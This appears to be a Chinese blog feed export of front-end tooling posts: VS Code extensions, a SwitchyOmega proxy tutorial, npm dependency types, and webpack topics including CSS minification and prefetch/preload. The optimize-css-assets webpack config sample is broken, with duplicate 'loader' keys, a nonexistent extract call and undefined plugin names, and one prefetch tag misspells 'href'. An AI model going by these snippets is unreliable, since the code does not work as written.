<h2 id="NPM-Intellisense"><a href="#NPM-Intellisense" class="headerlink" title="NPM Intellisense"></a>NPM Intellisense</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-db143f4cae36955c?imageMogr2/auto-orient/strip"></p>
<p>如动图所示，它能自动完成以 NPM 包为目标的 require import 语句。这可以提供很多帮助，尤其是当你的项目变得很大，并且在 package.json 中包含很多依赖项时。<br> <strong>项目地址</strong><br><a href="https://github.com/ChristianKohler/NpmIntellisense">https://github.com/ChristianKohler/NpmIntellisense</a><br><strong>Marketplace</strong><br><a href="https://marketplace.visualstudio.com/items?itemName=christian-kohler.npm-intellisense">https://marketplace.visualstudio.com/items?itemName=christian-kohler.npm-intellisense</a></p>
<h2 id="Path-Intellisense"><a href="#Path-Intellisense" class="headerlink" title="Path Intellisense"></a>Path Intellisense</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-afb2416b7e73f8e8.gif?imageMogr2/auto-orient/strip"></p>
<p>这是 NPM Intellisense 的姐妹插件。它会执行相同的自动补全，不过针对的是你的文件系统。<br><strong>项目地址</strong><br><a href="https://github.com/ChristianKohler/PathIntellisense">https://github.com/ChristianKohler/PathIntellisense</a><br><strong>Marketplace</strong><br><a href="https://marketplace.visualstudio.com/items?itemName=christian-kohler.path-intellisense">https://marketplace.visualstudio.com/items?itemName=christian-kohler.path-intellisense</a></p>
<h2 id="Quokka-js"><a href="#Quokka-js" class="headerlink" title="Quokka.js"></a>Quokka.js</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-ccab0e9d884fce5f.gif?imageMogr2/auto-orient/strip"><br>如果你只是想尝试一些东西，不想费劲先设置项目，那么这款工具就是一个很好的辅助。通过实时检查输出，它会立即将输出显示在 JavaScript/TypeScript 代码旁边，如动图所示。这是一个很好的扩展，特别适合调试目的。<br><strong>项目地址</strong><br><a href="https://quokkajs.com/">https://quokkajs.com/</a><br><strong>Marketplace</strong><br><a href="https://marketplace.visualstudio.com/items?itemName=WallabyJs.quokka-vscode">https://marketplace.visualstudio.com/items?itemName=WallabyJs.quokka-vscode</a></p>
<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>这个扩展是处理多个 Docker 映像和容器的必备，因为你可以用它快速浏览正在运行哪些容器、构建哪些映像以及创建哪些网络。<br><strong>项目地址</strong><br><a href="https://github.com/microsoft/vscode-docker">https://github.com/microsoft/vscode-docker</a><br><strong>Marketplace</strong><br><a href="https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-docker">https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-docker</a></p>
<h2 id="Live-Server"><a href="#Live-Server" class="headerlink" title="Live Server"></a>Live Server</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-6aae06bf0f4fff6b.gif?imageMogr2/auto-orient/strip"><br>这个扩展为本地开发服务器提供了热重载功能，也就是说它会在保存对文件所做的任何更改后立即刷新页面。它在状态栏中有一个漂亮的“Go Live”按钮，你只需单击一下即可启动服务器。<br><strong>项目地址</strong><br><a href="https://github.com/ritwickdey/vscode-live-server">https://github.com/ritwickdey/vscode-live-server</a><br><strong>Marketplace</strong><br><a href="https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer">https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer</a></p>
<h2 id="Auto-Close-Tag-和-Auto-Rename-Tag"><a href="#Auto-Close-Tag-和-Auto-Rename-Tag" class="headerlink" title="Auto Close Tag 和 Auto Rename Tag"></a>Auto Close Tag 和 Auto Rename Tag</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-879775d67e33686b.gif?imageMogr2/auto-orient/strip"><br>它们是 VS Code 的两个小插件，可通过自动重命名和关闭标签来帮助你维护 HTML 文件。这也适用于 React 自己的 JSX 语法。<br><strong>Auto Close Tag</strong><br><a href="https://github.com/formulahendry/vscode-auto-close-tag/https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-close-tag">https://github.com/formulahendry/vscode-auto-close-tag/https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-close-tag</a><br> <strong>Auto Rename Tag</strong><br><a href="https://github.com/formulahendry/vscode-auto-rename-tag/https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-rename-tag">https://github.com/formulahendry/vscode-auto-rename-tag/https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-rename-tag</a></p>
<h2 id="Markdown-Preview-Enhanced"><a href="#Markdown-Preview-Enhanced" class="headerlink" title="Markdown Preview Enhanced"></a>Markdown Preview Enhanced</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-fe3e4c69847e2ade.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br> Markdown 预览工具。它不仅为你提供预览，而且还有同步滚动、PDF 导出和 PlantUML 的功能。<br><strong>项目地址</strong><br><a href="https://github.com/shd101wyy/vscode-markdown-preview-enhanced">https://github.com/shd101wyy/vscode-markdown-preview-enhanced</a><br><strong>Marketplace</strong><br><a href="https://marketplace.visualstudio.com/items?itemName=shd101wyy.markdown-preview-enhanced">https://marketplace.visualstudio.com/items?itemName=shd101wyy.markdown-preview-enhanced</a></p>
]]></content>
      <categories>
        <category>tool</category>
      </categories>
  </entry>
  <entry>
    <title>谷歌浏览器SwitchyOmega插件安装使用教程</title>
    <url>/nirvana/tool/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8SwitchyOmega%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>SwitchyOmega是Chrome浏览器上的代理扩展程序,可以轻松快捷的管理和切换多个代理设置。接管浏览器代理方式，可瞬间切换代理和本地连接方式，配合socks5（等其他代理工具）可实现只代理部分国内无法访问的网站。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-61233ce7d20819e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>安装方法</p>
</blockquote>
<p>1、在线安装</p>
<p>在可以访问外网的环境下，从Chrome应用商店来安装：<a href="https://chrome.google.com/webstore/detail/padekgcemlokbadohgkifijomclgjgif">https://chrome.google.com/webstore/detail/padekgcemlokbadohgkifijomclgjgif</a></p>
<p>2、离线安装</p>
<p>去github下载最新版安装包：<a href="https://github.com/FelisCatus/SwitchyOmega/releases">https://github.com/FelisCatus/SwitchyOmega/releases</a></p>
<blockquote>
<p>使用方式</p>
</blockquote>
<p>1、新建一个情景模式</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-3937342562f3571e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="谷歌浏览器SwitchyOmega插件安装使用教程"></p>
<p>上图中，前两种是最常用的，如果是第一次使用，那就记住前两种即可，第一种是指定代理的方式，每次访问一定会从设置的代理中走，第二种是动态切换的方式，比如说你想让百度走国内的网络，而让谷歌走国外的网络。</p>
<p>2、配置情景模式</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-27088b3d66156959.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="谷歌浏览器SwitchyOmega插件安装使用教程"></p>
<p>我这里使用的是SSR的默认代理端口1080做演示，大家根据自己的代理工具来配置即可，注意“代理协议”别选错了。</p>
<p>3、配置自动切换</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-312d117ca68260d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="谷歌浏览器SwitchyOmega插件安装使用教程"></p>
<p>前两步完成之后，就已经可以了，但是每次使用的时候，需要在浏览器上手动点一下来切换（不是之前提到的浏览器代理设置），而这一步配置了自动切换以后，会自动根据域名来匹配情景模式。</p>
]]></content>
      <categories>
        <category>tool</category>
      </categories>
  </entry>
  <entry>
    <title>Error--Can&#39;t resolve &#39;fs&#39; in （webpack 2配置CSS-loadeers）</title>
    <url>/nirvana/webpack/webpack/Error--Can&#39;t-resolve-&#39;fs&#39;-in-%EF%BC%88webpack-2%E9%85%8D%E7%BD%AECSS-loadeers%EF%BC%89/</url>
    <content><![CDATA[<h4 id="前言，在之前有配置过webpack-2-中css-loaders，但是怎么也不正确"><a href="#前言，在之前有配置过webpack-2-中css-loaders，但是怎么也不正确" class="headerlink" title="前言，在之前有配置过webpack 2 中css loaders，但是怎么也不正确"></a>前言，在之前有配置过webpack 2 中css loaders，但是怎么也不正确</h4><p>报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR in .&#x2F;~&#x2F;convert-source-map&#x2F;index.js</span><br><span class="line">Module not found: Error: Can&#39;t resolve &#39;fs&#39; in &#39;&#x2F;Users&#x2F;ceshi&#x2F;Desktop&#x2F;webpack&#x2F;node_modules&#x2F;convert-source-map&#39;</span><br><span class="line"> @ .&#x2F;~&#x2F;convert-source-map&#x2F;index.js 2:9-22</span><br><span class="line"> @ .&#x2F;~&#x2F;css-loader&#x2F;lib&#x2F;css-base.js</span><br><span class="line"> @ .&#x2F;~&#x2F;css-loader!.&#x2F;app&#x2F;style.css</span><br><span class="line"> @ .&#x2F;app&#x2F;style.css</span><br><span class="line"> @ .&#x2F;app&#x2F;main.js</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e3392ce8d53748bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>解决方法，修改webpack的配置文件，增加一句代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node: &#123;</span><br><span class="line">       fs: &#39;empty&#39;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-525a508c7db21758.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>dependencies/devDependencies/peerDependencies/optionalDependencies/bundledDependencies</title>
    <url>/nirvana/webpack/webpack/dependencies-devDependencies-peerDependencies-optionalDependencies-bun/</url>
    <content><![CDATA[<h2 id="npm-目前支持以下几类依赖包管理："><a href="#npm-目前支持以下几类依赖包管理：" class="headerlink" title="npm 目前支持以下几类依赖包管理："></a><strong>npm</strong> 目前支持以下几类依赖包管理：</h2><ul>
<li>  dependencies</li>
<li>  devDependencies</li>
<li>  peerDependencies</li>
<li>  optionalDependencies</li>
<li>  bundledDependencies / bundleDependencies</li>
</ul>
<p>如果你想使用哪种依赖管理，那么你可以将它放在package.json中对应的依赖对象中，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;fw2&quot;: &quot;^0.3.2&quot;,</span><br><span class="line">    &quot;grunt&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;webpack&quot;: &quot;^3.6.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;gulp&quot;: &quot;^3.9.1&quot;,</span><br><span class="line">    &quot;hello-else&quot;: &quot;^1.0.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;peerDependencies&quot;: &#123; &#125;,</span><br><span class="line">  &quot;optionalDependencies&quot;: &#123; &#125;,</span><br><span class="line">  &quot;bundledDependencies&quot;: [] </span><br></pre></td></tr></table></figure>

<p>下面我们一一来看：</p>
<h2 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h2><p>应用依赖，或者叫做业务依赖，这是我们最常用的依赖包管理对象！它用于指定应用依赖的外部包，这些依赖是应用发布后正常执行时所需要的，但不包含测试时或者本地打包时所使用的包。可使用下面的命令来安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install packageName --save</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>dependencies</strong>是一个简单的JSON对象，包含<strong>包名</strong>与<strong>包版本</strong>，其中<strong>包版本</strong>可以是版本号或者URL地址。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  &quot;dependencies&quot; :&#123; </span><br><span class="line">    &quot;foo&quot; : &quot;1.0.0 - 2.9999.9999&quot;, &#x2F;&#x2F; 指定版本范围</span><br><span class="line">    &quot;bar&quot; : &quot;&gt;&#x3D;1.0.2 &lt;2.1.2&quot;, </span><br><span class="line">    &quot;baz&quot; : &quot;&gt;1.0.2 &lt;&#x3D;2.3.4&quot;, </span><br><span class="line">    &quot;boo&quot; : &quot;2.0.1&quot;, &#x2F;&#x2F; 指定版本</span><br><span class="line">    &quot;qux&quot; : &quot;&lt;1.0.0 || &gt;&#x3D;2.3.1 &lt;2.4.5 || &gt;&#x3D;2.5.2 &lt;3.0.0&quot;, </span><br><span class="line">    &quot;asd&quot; : &quot;http:&#x2F;&#x2F;asdf.com&#x2F;asdf.tar.gz&quot;, &#x2F;&#x2F; 指定包地址</span><br><span class="line">    &quot;til&quot; : &quot;~1.2&quot;,  &#x2F;&#x2F; 最近可用版本</span><br><span class="line">    &quot;elf&quot; : &quot;~1.2.3&quot;, </span><br><span class="line">    &quot;elf&quot; : &quot;^1.2.3&quot;, &#x2F;&#x2F; 兼容版本</span><br><span class="line">    &quot;two&quot; : &quot;2.x&quot;, &#x2F;&#x2F; 2.1、2.2、...、2.9皆可用</span><br><span class="line">    &quot;thr&quot; : &quot;*&quot;,  &#x2F;&#x2F; 任意版本</span><br><span class="line">    &quot;thr2&quot;: &quot;&quot;, &#x2F;&#x2F; 任意版本</span><br><span class="line">    &quot;lat&quot; : &quot;latest&quot;, &#x2F;&#x2F; 当前最新</span><br><span class="line">    &quot;dyl&quot; : &quot;file:..&#x2F;dyl&quot;, &#x2F;&#x2F; 本地地址</span><br><span class="line">    &quot;xyz&quot; : &quot;git+ssh:&#x2F;&#x2F;git@github.com:npm&#x2F;npm.git#v1.0.27&quot;, &#x2F;&#x2F; git 地址</span><br><span class="line">    &quot;fir&quot; : &quot;git+ssh:&#x2F;&#x2F;git@github.com:npm&#x2F;npm#semver:^5.0&quot;,</span><br><span class="line">    &quot;wdy&quot; : &quot;git+https:&#x2F;&#x2F;isaacs@github.com&#x2F;npm&#x2F;npm.git&quot;,</span><br><span class="line">    &quot;xxy&quot; : &quot;git:&#x2F;&#x2F;github.com&#x2F;npm&#x2F;npm.git#v1.0.27&quot;,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="devDependencies"><a href="#devDependencies" class="headerlink" title="devDependencies"></a>devDependencies</h2><p>开发环境依赖，仅次于<strong>dependencies</strong>的使用频率！它的对象定义和<strong>dependencies</strong>一样，只不过它里面的包只用于开发环境，不用于生产环境，这些包通常是单元测试或者打包工具等，例如<strong>gulp, grunt, webpack, moca, coffee</strong>等，可使用以下命令来安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install packageName --save-dev</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>举个栗子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; &quot;name&quot;: &quot;ethopia-waza&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;a delightfully fruity coffee varietal&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.2.3&quot;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;coffee-script&quot;: &quot;~1.6.3&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;prepare&quot;: &quot;coffee -o lib&#x2F; -c src&#x2F;waza.coffee&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;main&quot;: &quot;lib&#x2F;waza.js&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>prepare脚本会在发布前运行，因此使用者在编译项目时不用依赖它。在开发模式下，运行npm install, 同时也会执行prepare脚本，开发时可以很容易的测试。</p>
<blockquote>
<p>至此，你理解了 <strong>–save</strong>和 <strong>–save-dev</strong>的区别了吗？</p>
</blockquote>
<h2 id="peerDependencies"><a href="#peerDependencies" class="headerlink" title="peerDependencies"></a>peerDependencies</h2><p>同等依赖，或者叫同伴依赖，用于指定当前包（也就是你写的包）兼容的宿主版本。如何理解呢？ 试想一下，我们编写一个gulp的插件，而gulp却有多个主版本，我们只想兼容最新的版本，此时就可以用同等依赖（<strong>peerDependencies</strong>）来指定：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;gulp-my-plugin&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;0.0.1&quot;,</span><br><span class="line">  &quot;peerDependencies&quot;: &#123;</span><br><span class="line">    &quot;gulp&quot;: &quot;3.x&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当别人使用我们的插件时，<strong>peerDependencies</strong>就会告诉明确告诉使用方，你需要安装该插件哪个宿主版本。</p>
<p>通常情况下，我们会在一个项目里使用一个宿主（比如gulp）的很多插件，如果相互之间存在宿主不兼容，在执行<strong>npm install</strong>时，cli会抛出错误信息来告诉我们，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm ERR! peerinvalid The package gulp does not satisfy its siblings&#39; peerDependencies requirements!</span><br><span class="line">npm ERR! peerinvalid Peer gulp-cli-config@0.1.3 wants gulp@~3.1.9</span><br><span class="line">npm ERR! peerinvalid Peer gulp-cli-users@0.1.4 wants gulp@~2.3.0</span><br></pre></td></tr></table></figure>

<p>运行命令<strong>npm install gulp-my-plugin –save-dev</strong>来安装我们插件，我们来看下依赖图谱：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── gulp-my-plugin@0.0.1</span><br><span class="line">└── gulp@3.9.1</span><br></pre></td></tr></table></figure>

<p>OK, Nice!</p>
<blockquote>
<p>注意，npm 1 与 npm 2 会自动安装同等依赖，npm 3 不再自动安装，会产生警告！手动在package.json文件中添加依赖项可以解决。</p>
</blockquote>
<h2 id="optionalDependencies"><a href="#optionalDependencies" class="headerlink" title="optionalDependencies"></a>optionalDependencies</h2><p>可选依赖，如果有一些依赖包即使安装失败，项目仍然能够运行或者希望npm继续运行，就可以使用<strong>optionalDependencies</strong>。另外<strong>optionalDependencies</strong>会覆盖<strong>dependencies</strong>中的同名依赖包，所以不要在两个地方都写。</p>
<p>举个栗子，可选依赖包就像程序的插件一样，如果存在就执行存在的逻辑，不存在就执行另一个逻辑。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  var foo &#x3D; require(&#39;foo&#39;)</span><br><span class="line">  var fooVersion &#x3D; require(&#39;foo&#x2F;package.json&#39;).version</span><br><span class="line">&#125; catch (er) &#123;</span><br><span class="line">  foo &#x3D; null</span><br><span class="line">&#125;</span><br><span class="line">if ( notGoodFooVersion(fooVersion) ) &#123;</span><br><span class="line">  foo &#x3D; null</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; .. then later in your program ..</span><br><span class="line"> </span><br><span class="line">if (foo) &#123;</span><br><span class="line">  foo.doFooThings()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="bundledDependencies-bundleDependencies"><a href="#bundledDependencies-bundleDependencies" class="headerlink" title="bundledDependencies / bundleDependencies"></a>bundledDependencies / bundleDependencies</h2><p>打包依赖，<strong>bundledDependencies</strong>是一个包含依赖包名的数组对象，在发布时会将这个对象中的包打包到最终的发布包里。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;fe-weekly&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;ELSE 周刊&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index.js&quot;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;fw2&quot;: &quot;^0.3.2&quot;,</span><br><span class="line">    &quot;grunt&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;webpack&quot;: &quot;^3.6.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;gulp&quot;: &quot;^3.9.1&quot;,</span><br><span class="line">    &quot;hello-else&quot;: &quot;^1.0.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;bundledDependencies&quot;: [</span><br><span class="line">    &quot;fw2&quot;,</span><br><span class="line">    &quot;hello-else&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行打包命令<strong>npm pack</strong>, 在生成的<strong>fe-weekly-1.0.0.tgz</strong>包中，将包含<strong>fw2</strong>和<strong>hello-else</strong>。 但是值得注意的是，这两个包必须先在<strong>devDependencies</strong>或<strong>dependencies</strong>声明过，否则打包会报错。</p>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>webpack之插件optimize css assets webpack plugin</title>
    <url>/nirvana/webpack/webpack/optimize-css-assets-webpack-plugin/</url>
    <content><![CDATA[<h2 id="1-安装："><a href="#1-安装：" class="headerlink" title="1. 安装："></a>1. 安装：</h2><p>主要是用来压缩css文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i -D optimize-css-assets-webpack-plugin</span><br><span class="line">&#x2F;&#x2F; webpack 3及以下</span><br><span class="line">npm i -D optimize-css-assets-webpack-plugin@3.2.0 </span><br></pre></td></tr></table></figure>
<h2 id="2-webpack-config-js配置"><a href="#2-webpack-config-js配置" class="headerlink" title="2. webpack.config.js配置"></a>2. webpack.config.js配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var OptimizeCssAssetsPlugin &#x3D; require(&#39;optimize-css-assets-webpack-plugin&#39;);</span><br><span class="line">const MiniCssExtractPlugin &#x3D; require(&#39;mini-css-extract-plugin&#39;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.css$&#x2F;,</span><br><span class="line">        loader: MiniCssExtractPlugin.extract(&#39;style-loader&#39;, &#39;css-loader&#39;)</span><br><span class="line">        loader: MiniCssExtractPlugin.loader,</span><br><span class="line">        options: &#123;publicPath: &#39;&#x2F;public&#x2F;path&#x2F;to&#x2F;&#39; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    new ExtractTextPlugin(&#39;styles.css&#39;),</span><br><span class="line">    &#x2F;&#x2F;new OptimizeCssAssetsPlugin()</span><br><span class="line">    new OptimizeCSSAssetsPlugin(&#123;</span><br><span class="line">      assetNameRegExp: &#x2F;\.css$&#x2F;g,</span><br><span class="line">      cssProcessor: require(&#39;cssnano&#39;),</span><br><span class="line">      cssProcessorPluginOptions: &#123;</span><br><span class="line">        preset: [&#39;default&#39;, &#123; discardComments: &#123; removeAll: true &#125; &#125;],</span><br><span class="line">      &#125;,</span><br><span class="line">      canPrint: true</span><br><span class="line">    &#125;),</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="3-参数"><a href="#3-参数" class="headerlink" title="3. 参数"></a>3. 参数</h2><p>assetNameRegExp：一个正则表达式，指示应优化\最小化的资产的名称。提供的正则表达式针对配置中<br>ExtractTextPlugin实例导出的文件的文件名运行，而不是源CSS文件的文件名。默认为/.css$/g<br>cssProcessor：用于优化\最小化CSS的CSS处理器，默认为cssnano。这应该是一个跟随<br>cssnano.process接口的函数（接收CSS和选项参数并返回一个Promise）。<br>cssProcessorOptions：传递给cssProcessor的选项，默认为 {}<br>cssProcessorPluginOptions：传递给cssProcessor的插件选项，默认为 {}<br>canPrint：一个布尔值，指示插件是否可以将消息打印到控制台，默认为 true</p>
<blockquote>
<p>webpack4.X版本中，webpack -p命令，是可以默认压缩js文件的
  </p>
</blockquote>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>prefetch 和 preload 及 webpack 的相关处理</title>
    <url>/nirvana/webpack/webpack/prefetch-%E5%92%8C-preload-%E5%8F%8A-webpack-%E7%9A%84%E7%9B%B8%E5%85%B3%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<p>使用预取和预加载是网站性能和用户体验提升的一个很好的途径，本文介绍了使用 prefetch 和 prefetch 进行预取和预加载的方法，并使用 webpack 进行实现</p>
<h2 id="Link-的链接类型"><a href="#Link-的链接类型" class="headerlink" title="Link 的链接类型"></a>Link 的链接类型</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link"><code>&lt;link&gt;</code></a> 标签的 <code>rel</code> 属性可以定义链接类型，<code>prefetch</code> 是其中的一种，与 <code>href</code> 配合使用可以预取或预加载对应资源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; herf&#x3D;&quot;URL&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>preload</code> 是另外一种类型，同样用 href 定义资源地址，但其处理预取外，还会对资源进行解析，所以还要增加属性 as，说明资源的类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;preload&quot; href&#x3D;&quot;URL&quot; as&#x3D;&quot;MIME_TYPE&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="预取资源"><a href="#预取资源" class="headerlink" title="预取资源"></a>预取资源</h2><p><code>prefetch</code> 表示用户在接下来的浏览中（例如在下一个页面），有可能用到对应资源，提示浏览器要在闲时获取对应资源</p>
<p>先新建文件夹 prefetch-preload-demo（本文所有代码将在此创建），安装相关依赖，并新建文件夹 static</p>
<blockquote>
<p>mkdir prefetch-preload-demo<br>cd prefetch-preload-demo<br>npm init -y<br>npm i -D http-server<br>mkdir static</p>
</blockquote>
<p>在 static 中创建 <code>prefetch.html</code>， <code>main.js</code> 和 <code>script.js</code></p>
<p><code>prefetch.html</code> 定义了一个 <code>rel</code> 为 <code>prefetch</code> 的链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Prefetch&lt;&#x2F;title&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1&quot;&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;script.js&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;main.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>main.js</code> 创建了一个按钮，并绑定了点击事件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let button &#x3D; document.createElement(&#39;button&#39;);</span><br><span class="line">button.innerHTML &#x3D; &#39;Add Script&#39;;</span><br><span class="line">button.addEventListener(&#39;click&#39;, e &#x3D;&gt; &#123;</span><br><span class="line">  let script &#x3D; document.createElement(&quot;script&quot;);</span><br><span class="line">  script.src &#x3D; &quot;script.js&quot;;</span><br><span class="line">  document.head.appendChild(script);</span><br><span class="line">&#125;);</span><br><span class="line">document.body.appendChild(button);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>script.js</code> 只是简单的打印了一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(&#39;script run&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行服务器（也可在 <code>package.json</code> 中增加 <code>server</code> 脚本）</p>
<blockquote>
<p>npx http-server</p>
</blockquote>
<p>访问 <a href="http://localhost:8080/">http://localhost:8080</a> 并导航至 <code>static</code> 中，点击 prefetch.html，或者直接访问线上<a href="https://chanvinxiao.com/demo/html/prefetch.html">页面</a>，初始状态下，查看控制台的网络选项卡下的内容如下（不要勾选 <code>Disable Cache</code>，点击右侧齿轮，勾选 <code>Use large request rows</code>）</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-866a5d00121799d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li>  <code>script.js</code> 被 fetch 下来，size 列的两个数字，275 B 表示下载的字节大小，0 B 表示解析的字节大小（即目前并没有解析）</li>
<li>  控制台是空的，即脚本没有运行</li>
</ul>
<p>点击页面上的 <code>Add Script</code>，会在页面增加地址为 <code>script.js</code> 的 <code>&lt;script&gt;</code> 标签，此时网络选项卡会增加以下内容</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b41e6c0e3f87d223.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li>  下载字节量为 <code>(prefetch cache)</code> ，即直接从预取缓存获取资源，下面的解析后的字节不再为 0</li>
<li>  控制台打印出脚本中的调试内容，即这时脚本才被解析并运行</li>
</ul>
<h2 id="预加载资源"><a href="#预加载资源" class="headerlink" title="预加载资源"></a>预加载资源</h2><p><code>preload</code> 表示用户在当前的浏览中（往往是在当前页面），极有可以可能用到对应资源，提示浏览器要优先获取对应资源</p>
